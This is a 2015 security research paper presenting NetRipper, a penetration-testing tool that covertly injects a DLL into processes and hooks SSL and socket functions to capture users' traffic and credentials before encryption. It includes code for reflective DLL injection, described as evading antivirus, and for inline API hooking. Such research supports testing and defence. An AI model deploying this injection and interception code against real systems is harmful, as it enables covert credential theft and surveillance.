1 
NetRipper 
Smart traffic sniffing for penetration testers 
Ionut Popescu 
KPMG 
Bucharest, Romania 
PI:EMAIL 
April 2015 
Abstract — The post-exploitation activities in a penetration test can be challenging if the tester has low-
privileges on a fully patched, well configured Windows machine. This work presents a technique for helping 
the tester to find useful information by sniffing network traffic of the applications on the compromised 
machine, despite his low-privileged rights. Furthermore, the encrypted traffic is also captured before being 
sent to the encryption layer, thus all traffic (clear-text and encrypted) can be sniffed. The implementation 
of this technique is a tool called NetRipper which uses API hooking to do the actions mentioned above and 
which has been especially designed to be used in penetration tests. 
I. INTRODUCTION AND PROBLEM DESCRIPTION 
The following situation occurs pretty often in an internal penetration test: the tester gains low 
privileged access to a Windows machine (workstation or server) where he is able to execute arbitrary 
code. However, he has difficulty in escalating his privileges or pivoting to other machines because no 
obvious vulnerabilities can be found on that machine.  
The situation is frustrating as there are open network connections from the victim machine to other 
machines on the network, which may contain useful information for escalating privileges or for pivoting 
to other machines. However, the traffic cannot be easily intercepted because the lack of privileges. 
Furthermore, there may be also a user on that machine which is browsing the web or accessing internal 
services and his credentials would be useful for advancing the penetration test. 
So the problem is how to intercept the network traffic while having low privileges on a Windows 
machine? 
II. THE SOLUTION 
We have developed NetRipper, which is a standalone application (and Metasploit module) that is able 
to capture network traffic sent and received by applications which are running on the victim machine 
under the same user as the one compromised by the attacker. NetRipper captures network data while it 
is handled by the target applications by hooking function calls such as: 
- 
PR_Read and PR_Write from nss3.dll 
- 
PR_Send and PR_Recv from nspr4.dll 
- 
SslEncryptPacket and SslDecryptPacket from ncrypt.dll 
- 
send and recv from ws2_32.dll 
- 
SSL_Send and SSL_Recv from chrome.dll 
By hooking these functions, NetRipper is able to capture clear-text and encrypted (SSL/TLS) traffic 
sent or received by the target application if the application uses these specific functions for the network 
activity. 
2 
III. IMPLEMENTATION DETAILS 
A. Application overview 
NetRipper has three components: 
- 
NetRipper.exe – Is a standalone application responsible for configuring the DLL and for 
injecting it in various processes 
- 
DLL.dll – Is a shared library which hooks specific functions used by the target applications (ex. 
SslEncryptPacket), captures the data sent/received and writes it into a local file 
- 
netripper.rb – The Metasploit module used to inject the DLL into various processes 
In order to use NetRipper, the penetration tester should take the following steps: 
a. The penetration tester already has access to the server/workstation as an unprivileged user 
b. He uses NetRipper.exe or the Metasploit module to inject DLL.dll into a certain process 
c. DLL.dll captures data (SSL/TLS or clear-text) and writes it to an output file 
d. The penetration tester retrieves the output file containing plain-text and unencrypted data 
    The configuration options available for NetRipper in the current version are: 
- 
Process IDs – Specify one or more target process IDs (e.g. 1232, 4444) 
- 
Process names – Specify one or more target process names (e.g. firefox.exe, iexplore.exe) or 
specify ALL, which enables the injection in all processes 
- 
Captured data location – Where to save capture data (e.g. C:\Windows\TEMP) or specify the 
“TEMP” value to save data into user’s temporary data folder 
- 
Plugins – The name of the plugins used to filter captured data 
    NetRipper has also been implemented as a Metasploit post-exploitation module, which uses the 
reflective DLL injection technique to start the tool.  
B. Reflective DLL injection technique 
    NetRipper searches for target processes and injects the DLL using the Reflective DLL Injection 
technique pioneered by Stephen Fewer of Harmony Security [1]. This technique allows one to easily 
inject a DLL from memory into a target process without touching the disk, thus avoiding antivirus 
detection. 
    The steps that NetRipper takes in order to inject the DLL reflectively are the following: 
1. Open the remote process (OpenProcess API) 
2. Allocate memory inside the remote process for the whole DLL file (VirtualAllocEx API) 
3. Write the DLL.dll file into the remote process memory (WriteProcessMemory API) 
4. Create a new thread that calls the ReflectiveLoader function (CreateRemoteThread API) 
5. The ReflectiveLoader function correctly loads the DLL into memory 
3 
    A sample piece of code (from ReflectiveDLL project [2]) that injects the DLL into the target process 
is shown below: 
// check if the library has a ReflectiveLoader... 
dwReflectiveLoaderOffset = GetReflectiveLoaderOffset( lpBuffer ); 
if( !dwReflectiveLoaderOffset ) 
break; 
// alloc memory (RWX) in the host process for the image... 
lpRemoteLibraryBuffer = VirtualAllocEx( hProcess, NULL, dwLength, MEM_RESERVE|MEM_COMMIT, 
PAGE_EXECUTE_READWRITE );  
if( !lpRemoteLibraryBuffer ) 
break; 
// write the image into the host process... 
if( !WriteProcessMemory( hProcess, lpRemoteLibraryBuffer, lpBuffer, dwLength, NULL ) ) 
break; 
// add the offset to ReflectiveLoader() to the remote library address... 
lpReflectiveLoader 
= 
(LPTHREAD_START_ROUTINE)( 
(ULONG_PTR)lpRemoteLibraryBuffer 
+ 
dwReflectiveLoaderOffset ); 
// create a remote thread in the host process to call the ReflectiveLoader! 
hThread = CreateRemoteThread( hProcess, NULL, 1024*1024, lpReflectiveLoader, lpParameter, 
(DWORD)NULL, &dwThreadId ); 
C. API hooking technique 
    In order to sniff the network traffic sent and received by the target applications, we implemented an 
API hooking engine, using inline call hooks. This engine is implemented inside DLL.dll, which    hooks 
specific functions by following the next steps: 
1. Obtain a handle to the DLL containing the target function (for example ncrypt.dll) 
2. Find the address of target function (for example SslEncryptPacket) 
3. Save the first 5 bytes of the function code 
4. Place a call hook_address instruction at the beginning of the function, replacing the first 5 bytes 
The Hook function is the core hooking function and it is responsible for: 
1. Restoring the original bytes of the hooked function (in order to call original function later) 
2. Calling a specific callback function like SslEncryptPacket_Callback which handles the data 
received by the hooked function 
The implementation of SslEncryptPacket_Callback function follows these steps: 
1. Save unencrypted data before it is sent to the network 
2. Call the original function SslEnryptPacket to send network traffic 
3. Place the call hook_address again at the beginning of the target function to restore the hook 
4 
Example of code used for placing API hooks: 
vector vDlls = Process::GetProcessModules(0); 
for(size_t i = 0; i < vDlls.size(); i++) 
{ 
// SslEncryptPacket, SslDecryptPacket 
if(Utils::ToLower(vDlls[i].szModule).compare("ncrypt.dll") == 0) 
{ 
SslEncryptPacket_Original 
= 
(SslEncryptPacket_Typedef)GetProcAddress(LoadLibrary("ncrypt.dll"), "SslEncryptPacket"); 
SslDecryptPacket_Original 
= 
(SslDecryptPacket_Typedef)GetProcAddress(LoadLibrary("ncrypt.dll"), "SslDecryptPacket"); 
Hooker::AddHook("ncrypt.dll", 
(void 
*)SslEncryptPacket_Original, 
(void 
*)SslEncryptPacket_Callback); 
Hooker::AddHook("ncrypt.dll", 
(void 
*)SslDecryptPacket_Original, 
(void 
*)SslDecryptPacket_Callback); 
} 
// send, recv 
else if(Utils::ToLower(vDlls[i].szModule).compare("ws2_32.dll") == 0) 
{ 
recv_Original 
= 
(recv_Typedef)GetProcAddress(LoadLibrary("ws2_32.dll"), 
"recv"); 
send_Original 
= 
(send_Typedef)GetProcAddress(LoadLibrary("ws2_32.dll"), 
"send"); 
Hooker::AddHook("ws2_32.dll", (void *)recv_Original, (void *)recv_Callback); 
Hooker::AddHook("ws2_32.dll", (void *)send_Original, (void *)send_Callback); 
} 
... 
} 
A sample callback function used for handling data is shown below: 
LONG __stdcall SslEncryptPacket_Callback(ULONG_PTR hSslProvider, ULONG_PTR hKey, PBYTE 
*pbInput, DWORD cbInput, PBYTE pbOutput, DWORD cbOutput, DWORD *pcbResult, ULONGLONG 
SequenceNumber, DWORD dwContentType, DWORD dwFlags) 
{ 
LONG res; 
... 
Utils::WriteToTempFile("SslEncryptPacket.txt", (char *)pbInput, cbInput); 